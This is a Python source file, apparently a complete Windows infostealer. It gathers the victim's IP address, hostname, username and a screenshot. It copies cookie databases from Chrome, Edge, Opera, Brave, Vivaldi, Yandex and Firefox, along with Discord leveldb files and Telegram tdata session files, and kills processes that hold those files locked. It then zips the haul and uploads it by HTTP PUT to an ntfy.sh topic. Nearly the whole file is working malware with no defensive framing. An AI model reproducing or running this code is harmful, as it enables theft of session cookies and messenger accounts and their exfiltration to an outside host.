import os
import zipfile
import requests
import platform
import getpass
import io
import mss
import re
import psutil

# Required external libs: psutil, mss, requests.

# Config
NTFY_SH_THEME_URL = "https://ntfy.sh/cKm1aDvKycbenjJN"

# Do not touch
FILE_SHARE_READ= 0x00000001

# Collecting data about our system
def get_ip():
    try:
        r = requests.get("https://api.ipify.org")
        return r.text
    except:
        return None

def get_screenshot():
    png = None
    with mss.mss() as sct:
        monitor = sct.monitors[-1]  # Getting image of ALL monitors (-1)
        sct_img = sct.grab(monitor)
        png = mss.tools.to_png(sct_img.rgb, sct_img.size)
    return png

def get_browser_patches_to_pack():
    appdata_local = os.getenv("LOCALAPPDATA")
    appdata_roaming = os.getenv('APPDATA')

    # Firefox and other Gecko based browsers patchs will be appended later. UPD: only firefox...
    patches_to_test = [
        # Tbh there's almost no other browsers left except blink based... 
        (os.path.join(appdata_local, "Google\\Chrome\\User Data\\Default\\Cookies"), "Chrome Cookies"),
        (os.path.join(appdata_local, "Google\\Chrome\\User Data\\Default\\Network\\Cookies"), "Chrome Network Cookies"),
        (os.path.join(appdata_local, "Microsoft\\Edge\\User Data\\Default\\Cookies"), "Edge Cookies"),
        (os.path.join(appdata_local, "Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"), "Edge Network Cookies"),
        (os.path.join(appdata_roaming, "Opera Software\\Opera Stable\\Cookies"), "Opera Cookies"),
        (os.path.join(appdata_roaming, "Opera Software\\Opera Stable\\Network\\Cookies"), "Opera Network Cookies"),
        (os.path.join(appdata_roaming, "Opera Software\\Opera GX Stable\\Cookies"), "Opera GX Cookies"),
        (os.path.join(appdata_roaming, "Opera Software\\Opera GX Stable\\Network\\Cookies"), "Opera GX Network Cookies"),
        (os.path.join(appdata_local, "BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies"), "Brave Cookies"),
        (os.path.join(appdata_local, "BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"), "Brave Network Cookies"),
        (os.path.join(appdata_local, "Vivaldi\\User Data\\Default\\Cookies"), "Vivaldi Cookies"),
        (os.path.join(appdata_local, "Vivaldi\\User Data\\Default\\Network\\Cookies"), "Vivaldi Network Cookies"),
        (os.path.join(appdata_local, "Yandex\\YandexBrowser\\User Data\\Default\\Cookies"), "Yandex Cookies"),
        (os.path.join(appdata_local, "Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies"), "Yandex Network Cookies")
    ]

    existing_pathes = []

    for path in patches_to_test:
        if os.path.exists(path[0]):
            existing_pathes.append(path)
    
    # Firefox has interesting system with multiple profiles. Each profile is directory named with this specific format: xxxxxxxx.profilename. And each profile dir has its own cookie file 
    firefox_profiles_dir = os.path.join(appdata_roaming, "Mozilla\\Firefox\\Profiles\\")
    if os.path.exists(firefox_profiles_dir):
        profiles = os.listdir(firefox_profiles_dir)
        for profile in profiles:
            profile_dir = os.path.join(firefox_profiles_dir,profile)
            if os.path.exists(os.path.join(profile_dir,"cookies.sqlite")):
                existing_pathes.append((os.path.join(profile_dir, "cookies.sqlite"), f"Firefox {profile} cookies.sqlite"))
    return existing_pathes

def get_discord_pathes(): # We are saving all files in levelDB dir. Idk lol
    appdata_roaming = os.getenv('APPDATA')
    ldb_path = os.path.join(appdata_roaming,"discord\\Local Storage\\leveldb")
    if os.path.exists(ldb_path):
        files_to_save = os.walk(ldb_path)
        return (ldb_path, files_to_save)
    return None

def get_telegram_pathes():
    appdata_roaming = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata_roaming,"Telegram Desktop\\tdata")
    if os.path.exists(tdata_path):
        filesindir = os.listdir(tdata_path)
        mathing_16dc_d = []
        for file in filesindir:
            if re.fullmatch(r'^[A-Z\d]{16}$', file):
                mathing_16dc_d.append(file)
        filesindir = []
        for dir in mathing_16dc_d:
            if os.path.isdir(os.path.join(tdata_path, dir)):
                if os.path.isfile(os.path.join(tdata_path, dir+"s")):
                    filesindir.append(os.path.join(tdata_path, dir+"s"))
                if os.path.isfile(os.path.join(tdata_path, dir, "maps")):
                    filesindir.append(os.path.join(tdata_path, dir, "maps"))
        if os.path.isfile(os.path.join(tdata_path, "key_datas")):
            filesindir.append(os.path.join(tdata_path, "key_datas"))
        return (tdata_path, filesindir)

    return None

# Two funcs kindly written by AI
def find_process_blocking_file(file_path):
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            for item in proc.open_files():
                if item.path == file_path:
                    return proc
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return None

def kill_process(proc):
    proc.terminate()  # Trying proper termination
    try:
        proc.wait(timeout=3)  # Waiting for termination
    except psutil.TimeoutExpired:
        proc.kill()  # Force killing process

# Collecting data about system
collected_data = {}

collected_data['ip'] = get_ip()
collected_data['hostname'] = platform.node()
collected_data['winver'] = platform.win32_ver()
collected_data['cpu'] = platform.processor()
collected_data['username'] = getpass.getuser()

# Collecting files
report_archive = io.BytesIO()
report_archive.seek(0)
report_archive.name = "report.zip"
screenshot_byte_stream = io.BytesIO(get_screenshot()) # Saving screenshot to memory buffer
screenshot_byte_stream.seek(0)
screenshot_byte_stream.name = "image.png"
browsers = get_browser_patches_to_pack()
discord = get_discord_pathes() # We save ALL files in leveldb directory. Reminder for me in future: this func returns generator
telegram_files = get_telegram_pathes()

with zipfile.ZipFile(report_archive, "w", zipfile.ZIP_DEFLATED, False) as archive:
    message=""
    for k,v in enumerate(collected_data):
        message+=f"{v}: {collected_data[v]}\n"
    archive.writestr("stealer-report.txt", bytes(message.encode("utf-8")))
    # I was too lazy to make function for shared read, sorry
    # Browsers. We trying three methods of read: default, shared, after terminating process. From less to more invasive.
    for browser in browsers:
        try:
            with open(browser[0], 'rb') as cookie:
                archive.writestr(browser[1], cookie.read())
        except IOError:
            try:
                fd = os.open(browser[0], os.O_RDONLY | os.O_BINARY | os.O_NOINHERIT, share_mode=FILE_SHARE_READ)
                with os.fdopen(fd, 'rb'):
                    archive.writestr(browser[1], cookie.read())
            except:
                proc = find_process_blocking_file(browser[0])
                if proc != None:
                    kill_process(proc)
                    try:
                        with open(browser[0], 'rb') as cookie:
                            archive.writestr(browser[1], cookie.read())
                    except:
                        pass
        except:
            pass
    # Discord
    if discord!=None:
        for iter in discord[1]:
            for file in iter[2]:
                try:
                    with open(os.path.join(iter[0], file), 'rb') as cookie:
                        archive.writestr(os.path.join("Discord",os.path.relpath(os.path.join(iter[0], file),discord[0])), cookie.read())
                except IOError:
                    try:
                        fd = os.open(os.path.join(iter[0], file), os.O_RDONLY | os.O_BINARY | os.O_NOINHERIT, share_mode=FILE_SHARE_READ)
                        with os.fdopen(fd, 'rb'):
                            archive.writestr(os.path.join("Discord",os.path.relpath(os.path.join(iter[0], file),discord[0])), cookie.read())
                    except:
                        proc = find_process_blocking_file(os.path.join(iter[0], file))
                        if proc != None:
                            kill_process(proc)
                            try:
                                with open(os.path.join(iter[0], file), 'rb') as cookie:
                                    archive.writestr(os.path.join("Discord",os.path.relpath(os.path.join(iter[0], file),discord[0])), cookie.read())
                            except:
                                pass
                except:
                    pass
    # Telegram
    if telegram_files!=None:
        for file in telegram_files[1]:
            try:
                with open(file, 'rb') as cookie:
                    archive.writestr(os.path.join("Telegram tdata",os.path.relpath(file,telegram_files[0])), cookie.read())
            except IOError:
                try:
                    fd = os.open(file, os.O_RDONLY | os.O_BINARY | os.O_NOINHERIT, share_mode=FILE_SHARE_READ)
                    with os.fdopen(fd, 'rb'):
                        archive.writestr(os.path.join("Telegram tdata",os.path.relpath(file,telegram_files[0]), cookie.read()))
                except:
                    proc = find_process_blocking_file(file)
                    if proc != None:
                        kill_process(proc)
                        try:
                            with open(file, 'rb') as cookie:
                                archive.writestr(os.path.join("Telegram tdata",os.path.relpath(file,telegram_files[0])), cookie.read())
                        except:
                            pass
            except:
                pass
    if screenshot_byte_stream != None:
        archive.writestr("screenshot.png", screenshot_byte_stream.getbuffer())

report_archive.seek(0)

response = requests.put(NTFY_SH_THEME_URL, data=report_archive)

print(response.status_code)